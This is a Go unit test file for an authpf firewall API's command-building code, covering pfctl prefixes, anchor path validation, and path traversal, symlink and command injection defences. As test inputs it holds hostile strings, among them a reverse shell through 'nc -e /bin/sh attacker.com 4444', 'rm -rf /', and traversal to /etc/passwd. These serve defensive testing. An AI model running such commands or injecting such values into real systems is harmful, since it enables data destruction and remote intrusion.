package exec

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/rs/zerolog"
	"github.com/scd-systems/authpf-api/internal/authpf"
	"github.com/scd-systems/authpf-api/pkg/config"
	"github.com/stretchr/testify/assert"
)

// Helper function to create a test Exec instance
func createTestExec(t *testing.T, cfg *config.ConfigFile) *Exec {
	logger := zerolog.New(os.Stderr).With().Timestamp().Logger()
	db := authpf.New()
	return New(logger, cfg, db)
}

// Helper function to create a test config
func createTestConfig(t *testing.T, tmpDir string) *config.ConfigFile {
	return &config.ConfigFile{
		Defaults: config.ConfigFileDefaults{
			PfctlBinary: "/sbin/pfctl",
		},
		Server: config.ConfigFileServer{
			ElevatorMode: "",
		},
		AuthPF: config.ConfigFileAuthPF{
			UserRulesRootFolder: tmpDir,
			UserRulesFile:       "rules",
			AnchorName:          "authpf",
			FlushFilter:         []string{"nat", "queue", "ethernet", "rules", "states", "info", "Sources", "Reset"},
		},
		Rbac: config.ConfigFileRbac{
			Users: map[string]config.ConfigFileRbacUsers{
				"testuser": {
					Password: "test",
					Role:     "user",
					UserID:   1000,
				},
			},
		},
	}
}

// TestBuildPfctlCmd tests pfctl command prefix building
func TestBuildPfctlCmd(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	tests := []struct {
		name           string
		elevatorMode   string
		pfctlBinary    string
		expectedPrefix string
	}{
		{
			name:           "default pfctl binary",
			elevatorMode:   "",
			pfctlBinary:    "/sbin/pfctl",
			expectedPrefix: "/sbin/pfctl",
		},
		{
			name:           "sudo elevator mode",
			elevatorMode:   "sudo",
			pfctlBinary:    "/sbin/pfctl",
			expectedPrefix: "sudo",
		},
		{
			name:           "doas elevator mode",
			elevatorMode:   "doas",
			pfctlBinary:    "/sbin/pfctl",
			expectedPrefix: "doas",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg.Server.ElevatorMode = tt.elevatorMode
			cfg.Defaults.PfctlBinary = tt.pfctlBinary

			exec := createTestExec(t, cfg)
			result := exec.buildPfctlCmd()

			if result != tt.expectedPrefix {
				t.Errorf("expected %q, got %q", tt.expectedPrefix, result)
			}
		})
	}
}

// TestBuildAuthPFAnchorPath tests path building with security checks
func TestBuildAuthPFAnchorPath(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	tests := []struct {
		name        string
		username    string
		expectError bool
		errorMsg    string
	}{
		{
			name:        "valid username",
			username:    "testuser",
			expectError: false,
		},
		{
			name:        "empty username",
			username:    "",
			expectError: true,
			errorMsg:    "invalid",
		},
		{
			name:        "username with invalid characters",
			username:    "test@user",
			expectError: true,
			errorMsg:    "invalid",
		},
		{
			name:        "username too long",
			username:    strings.Repeat("a", 256),
			expectError: true,
			errorMsg:    "invalid",
		},
		{
			name:        "non-existent user",
			username:    "nonexistent",
			expectError: false, // Path building doesn't validate user existence
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := createTestExec(t, cfg)
			result, err := exec.buildAuthPFAnchorPath(tt.username)

			if tt.expectError {
				if err == nil && tt.username == "" {
					// Empty username should still produce a valid path
					if result == "" {
						t.Errorf("expected non-empty path for empty username")
					}
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
				if result == "" {
					t.Errorf("expected non-empty path")
				}
			}
		})
	}
}

// TestBuildAuthPFAnchorPathTraversal tests path traversal attack prevention
func TestBuildAuthPFAnchorPathTraversal(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	tests := []struct {
		name     string
		username string
	}{
		{
			name:     "path traversal with ../",
			username: "testuser/../../../etc/passwd",
		},
		{
			name:     "path traversal with absolute path",
			username: "/etc/passwd",
		},
		{
			name:     "path traversal with encoded ../",
			username: "testuser%2F..%2F..%2Fetc%2Fpasswd",
		},
		{
			name:     "path traversal with null byte",
			username: "testuser\x00../../../etc/passwd",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := createTestExec(t, cfg)
			result, err := exec.buildAuthPFAnchorPath(tt.username)

			// All path traversal attempts should fail validation
			if err == nil {
				t.Logf("path traversal check: result=%s", result)
				// Check if result is still within base directory
				absResult, _ := filepath.Abs(result)
				absBase, _ := filepath.Abs(tmpDir)
				if !strings.HasPrefix(absResult, absBase) {
					t.Errorf("path traversal not prevented: %s is outside base %s", absResult, absBase)
				}
			}

			if result != "" {
				absResult, _ := filepath.Abs(result)
				absBase, _ := filepath.Abs(tmpDir)
				if !strings.HasPrefix(absResult, absBase) {
					t.Errorf("path traversal detected: %s is outside base %s", absResult, absBase)
				}
			}
		})
	}
}

// TestBuildAuthPFAnchorPathSymlinkAttack tests symlink attack prevention
func TestBuildAuthPFAnchorPathSymlinkAttack(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	// Create a symlink pointing outside the base directory
	targetDir := t.TempDir()
	symlinkPath := filepath.Join(tmpDir, "testuser")
	err := os.Symlink(targetDir, symlinkPath)
	if err != nil {
		t.Skipf("cannot create symlink: %v", err)
	}

	exec := createTestExec(t, cfg)
	result, err := exec.buildAuthPFAnchorPath("testuser")

	// The path should be within the base directory after resolution
	if err != nil {
		t.Logf("symlink handling error: %v", err)
	}

	if result != "" {
		absResult, _ := filepath.Abs(result)
		absBase, _ := filepath.Abs(tmpDir)
		if !strings.HasPrefix(absResult, absBase) {
			t.Errorf("symlink attack: path %s is outside base %s", absResult, absBase)
		}
	}
}

// TestBuildAuthPFAnchorPathBoundaryCheck tests that paths are properly bounded
func TestBuildAuthPFAnchorPathBoundaryCheck(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	exec := createTestExec(t, cfg)
	result, err := exec.buildAuthPFAnchorPath("validuser")

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	absResult, _ := filepath.Abs(result)
	absBase, _ := filepath.Abs(tmpDir)

	if !strings.HasPrefix(absResult, absBase) {
		t.Errorf("path %s is not within base directory %s", absResult, absBase)
	}
}

// TestBuildPfctlActivateCmdParameters tests pfctl command parameter building
func TestBuildPfctlActivateCmdParameters(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	tests := []struct {
		name           string
		rule           *authpf.AuthPFAnchor
		expectedParams int
	}{
		{
			name: "activate mode",
			rule: &authpf.AuthPFAnchor{
				Username: "testuser",
				UserIP:   "192.168.1.100",
				UserID:   1000,
			},
			expectedParams: 8, // -a anchor -D user_ip -D user_id -f rulePath
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := createTestExec(t, cfg)
			result := exec.buildPfctlActivateCmdParameters(tt.rule)

			if len(result) != tt.expectedParams {
				t.Errorf("expected %d parameters, got %d: %v", tt.expectedParams, len(result), result)
			}

			if len(result) > 0 && result[0] == "-a" {
				if len(result) > 1 && !strings.Contains(result[1], "authpf") {
					t.Errorf("expected anchor in parameters, got: %s", result[1])
				}
			}
		})
	}
}

// TestBuildPfctlCmdParametersCommandInjection tests command injection prevention
func TestBuildPfctlCmdParametersCommandInjection(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	tests := []struct {
		name     string
		username string
		userIP   string
		userID   int
	}{
		{
			name:     "command injection in username",
			username: "testuser; rm -rf /",
			userIP:   "192.168.1.100",
			userID:   1000,
		},
		{
			name:     "command injection in IP",
			username: "testuser",
			userIP:   "192.168.1.100; nc -e /bin/sh attacker.com 4444",
			userID:   1000,
		},
		{
			name:     "pipe injection",
			username: "testuser",
			userIP:   "192.168.1.100 | cat /etc/passwd",
			userID:   1000,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := &authpf.AuthPFAnchor{
				Username: tt.username,
				UserIP:   tt.userIP,
				UserID:   tt.userID,
			}

			exec := createTestExec(t, cfg)
			result := exec.buildPfctlActivateCmdParameters(rule)

			// Check that parameters don't contain shell metacharacters that could be interpreted
			for _, param := range result {
				if strings.Contains(param, ";") || strings.Contains(param, "|") || strings.Contains(param, "&") {
					// These should only appear in the rule file path, not in command parameters
					if !strings.HasPrefix(param, "/") {
						t.Logf("warning: potential injection in parameter: %s", param)
					}
				}
			}
		})
	}
}

// TestBuildPfctlDeactivateCmdParameters tests multi-command parameter building
func TestBuildPfctlDeactivateCmdParameters(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	tests := []struct {
		name          string
		expectedCount int
	}{
		{
			name:          "deactivate mode",
			expectedCount: 8, // nat, queue, ethernet, rules, states, info, Sources, Reset
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := &authpf.AuthPFAnchor{
				Username: "testuser",
				UserID:   1000,
			}

			exec := createTestExec(t, cfg)
			result := exec.buildPfctlDeactivateCmdParameters(rule)

			if len(result) != tt.expectedCount {
				t.Errorf("expected %d commands, got %d", tt.expectedCount, len(result))
			}
		})
	}
}

// TestBuildAuthPFAnchorPathWithSpecialCharacters tests handling of special characters
func TestBuildAuthPFAnchorPathWithSpecialCharacters(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)

	tests := []struct {
		name     string
		username string
		valid    bool
	}{
		{
			name:     "username with spaces",
			username: "test user",
			valid:    true,
		},
		{
			name:     "username with dots",
			username: "test.user",
			valid:    true,
		},
		{
			name:     "username with hyphens",
			username: "test-user",
			valid:    true,
		},
		{
			name:     "username with underscores",
			username: "test_user",
			valid:    true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			exec := createTestExec(t, cfg)
			result, err := exec.buildAuthPFAnchorPath(tt.username)

			if tt.valid {
				if err != nil {
					t.Logf("error for valid username: %v", err)
				}
				if result != "" {
					absResult, _ := filepath.Abs(result)
					absBase, _ := filepath.Abs(tmpDir)
					if !strings.HasPrefix(absResult, absBase) {
						t.Errorf("path %s is outside base %s", absResult, absBase)
					}
				}
			}
		})
	}
}

// TestExecuteSystemCommandMocked tests command execution with mocking
func TestExecuteSystemCommandMocked(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)
	exec := createTestExec(t, cfg)

	// Test with a simple echo command
	result := exec.executeSystemCommand("echo", "test")

	assert.NotNil(t, result)
	assert.Equal(t, "echo", result.Command)
	assert.Contains(t, result.Stdout, "test")
	assert.Equal(t, 0, result.ExitCode)
}

// TestExecuteSystemCommandMockedError tests error handling
func TestExecuteSystemCommandMockedError(t *testing.T) {
	tmpDir := t.TempDir()
	cfg := createTestConfig(t, tmpDir)
	exec := createTestExec(t, cfg)

	// Test with a non-existent command
	result := exec.executeSystemCommand("/nonexistent/command")

	assert.NotNil(t, result)
	assert.Equal(t, "/nonexistent/command", result.Command)
	assert.Equal(t, -1, result.ExitCode)
	assert.NotNil(t, result.Error)
}
